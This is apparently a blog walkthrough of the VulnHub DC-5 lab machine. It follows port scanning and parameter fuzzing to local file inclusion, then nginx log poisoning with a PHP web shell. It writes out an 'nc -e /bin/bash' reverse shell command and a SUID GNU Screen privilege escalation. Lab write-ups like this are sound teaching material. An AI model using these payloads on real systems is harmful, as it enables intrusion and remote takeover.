

DC-5 is the most application-logic-heavy box in the series so far. There is no brute forcing, no leaked credentials, no CMS with a known CVE waiting to be looked up. Instead, the entire path to root starts with noticing that a page behaves slightly differently than it should, and following that thread through fuzzing, file inclusion, log poisoning, and finally an oddly permissioned system binary.

Here is how I got from an open port scan to root on DC-5.

**Target:** DC-5 (VulnHub), **OS:** Debian, **Difficulty:** Intermediate

## Step 1: A Quiet Nmap Scan

nmap -p- -sC -sV -T5 dc-5

80/tcp    open  http    nginx 1.6.2  
111/tcp   open  rpcbind  
37584/tcp open  status

The RPC services were unremarkable. Everything interesting was going to come from port 80.

## Step 2: Mapping the Site

DirBuster turned up a small, ordinary-looking site: an index page, an FAQ, a solutions page, an about-us page, and a contact form. Nothing screamed vulnerability. That is often exactly when it pays to slow down and look closer.

## Step 3: A Form That Behaves Strangely

The contact form sent a plain GET request, easy to intercept with Burp Suite. Two small details caught my attention. The parameters were not sanitized in any visible way, and the footer’s copyright text on the resulting `thankyou.php` page changed every time I refreshed it, as if the backend was pulling content from different files behind the scenes without me asking it to.

That combination, unsanitized input plus dynamic file-like behavior, was enough of a signal to start fuzzing.

## Step 4: Finding a Parameter That Was Never Supposed to Show Up

`wfuzz -c -z file,/usr/share/seclists/Discovery/Web-Content/burp-parameter-names.txt --hh 851 "http://dc-5/thankyou.php?FUZZ=datadata"

Filtering out the baseline “nothing here” response length left exactly one result: a parameter called **file**.

A name like that is not subtle. It is basically the application telling you what it does with that value before you have even tested it.

## Step 5: Confirming Local File Inclusion

http://dc-5/thankyou.php?file=/etc/passwd

That came back with the contents of `/etc/passwd`. Pointing it at a file inside the web root confirmed the behavior further:

http://dc-5/thankyou.php?file=/var/www/html/index.php

The source of `index.php` rendered directly inside the response. This was not just a file reader, it was a genuine Local File Inclusion vulnerability.

## Step 6: Mapping What Else Was Readable

wfuzz -c -z file,/usr/share/seclists/Fuzzing/LFI/LFI-Jhaddix.txt --hh 835 "http://dc-5/thankyou.php?file=FUZZ"

I ran an unfiltered pass first to see what a typical failed response looked like, then filtered that size out on the real run. The result was a long list of readable files: `/etc/passwd` through a dozen traversal variations, `/etc/hosts`, `/etc/crontab`, `/etc/ssh/sshd_config`, assorted `/proc` entries, and several logs under `/var/log`. The wordlist was not nginx-specific, so there was likely more to find, but this was already plenty to work with.

## Step 7: Turning File Read Into Code Execution

An LFI on its own only reads files. To get code execution, I needed to get PHP code into a file the server would write to on every request, then include that file through the vulnerable parameter. The nginx error log was the target.

http://dc-5/thankyou.php?file=<?php system($_GET['cmd']); ?>

Once that payload landed in `/var/log/nginx/error.log`, including that same log file through the `file` parameter would execute whatever PHP was sitting inside it. In effect, the `cmd` parameter became a command execution endpoint.

[](https://events.zoom.us/ev/AjBDzTIgBOjbXyyuF_i2JHKceeuBRp1dycq5phbyKx5EiRMkuSIE~ArkW9LST0g8ykivRZyFH3rRErP9ufAxV9j5V344fZoBICauQAZumvmLfFw?source=promotion_paragraph---post_body_banner_the_writers_circle--3266d32a45c0-----------------------------------------)

I started a listener:

nc -lvnp 4444

And triggered the reverse shell by including the poisoned log and passing a reverse shell command through `cmd`:

http://dc-5/thankyou.php?file=/var/log/nginx/error.log&cmd=nc%20-e%20/bin/bash%20192.168.56.1%204444

The listener caught the connection. Shell as `nobody`.

## Step 8: Stabilizing and Looking Around

python -c 'import pty; pty.spawn("/bin/bash")'

As `nobody`, there was almost nothing I could do yet. Time to look for a way up.

## Step 9: A SUID Binary That Should Not Be There

find / -perm -u=s -type f 2>/dev/null

Most of the results were the usual suspects. One was not: **GNU Screen 4.5.0**, sitting with the SUID bit set. A terminal multiplexer has no business running as root by default, which made it an immediate point of interest.

searchsploit screen 4.5.0

This returned a known local privilege escalation exploit for that exact version.

## Step 10: Root

searchsploit -m linux/local/41154.sh

After copying the script and recreating it on the target inside `/var/tmp`, I made it executable and ran it:

chmod 755 41154.sh  
./41154.sh

Root shell, immediately.

## Step 11: The Final Flag

cd /root  
cat thisistheflag.txt

A closing ASCII message and a thank-you from the box’s creator wrapped things up. Machine complete.